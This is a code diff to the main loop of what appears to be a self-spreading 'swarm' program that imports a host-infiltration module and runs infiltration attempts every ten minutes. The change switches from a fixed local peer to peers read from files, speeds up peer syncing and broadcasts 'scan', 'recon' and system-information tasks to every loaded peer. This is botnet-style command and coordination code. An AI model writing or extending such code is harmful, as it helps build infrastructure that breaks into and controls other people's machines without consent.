@@ -4,7 +4,7 @@ import os
 from memory.decay import decay_memory
 from memory.tagger import log_tagged_memory
 from net.plugin_trigger_engine import run_plugins_by_trigger, start_plugins
-from net.peer_client import sync_with_peer
+from net.peer_client import sync_with_peer, load_peers 
 from net.seed_decider import prioritize
 from net.host_infiltrator import attempt_infiltration
 from net.swarm_vote import swarm_vote, load_peer_logs
@@ -12,10 +12,12 @@ from net.swarm_merge import merge_peer_logs
 from net.dynamic_leader import elect_leader
 from net.task_splitter import assign_tasks, broadcast_assignments
 from net import aria_server
+import json
+import random
 
 MEMORY_FILE = "memory/log.txt"
 PEER_LOGS = ["memory/log.txt"]  # can be updated to include peer files
-SYNC_PEER = "127.0.0.1"
+
 
 def background_decay():
     while True:
@@ -27,8 +29,9 @@ def background_plugins():
 
 def background_sync():
     while True:
-        sync_with_peer(SYNC_PEER)
-        time.sleep(60)
+        SYNC_PEERS = load_peers()
+        sync_with_peer(random.choice(SYNC_PEERS).strip())
+        time.sleep(5)
 
 def background_vote():
     while True:
@@ -44,9 +47,19 @@ def background_infiltration():
             attempt_infiltration()
         time.sleep(600)
 
+def load_peers_from_status(file="peer_status.json"):
+    try:
+        with open(file, "r") as f:
+            data = json.load(f)
+        # Filter for peers with low failure count or recent seen time
+        return [ip for ip, meta in data.items() if meta.get("failures", 99) < 99999]
+    except Exception as e:
+        print(f"[!] Failed to load peer list: {e}")
+        return ["127.0.0.1"]
+    
 def background_assign_tasks():
     while True:
-        peers = ["127.0.0.1"]
+        peers = load_peers_from_status()
         tasks = ["scan", "recon", "plugin:sysinfo"]
         assignments = assign_tasks(tasks, peers)
         broadcast_assignments(assignments)
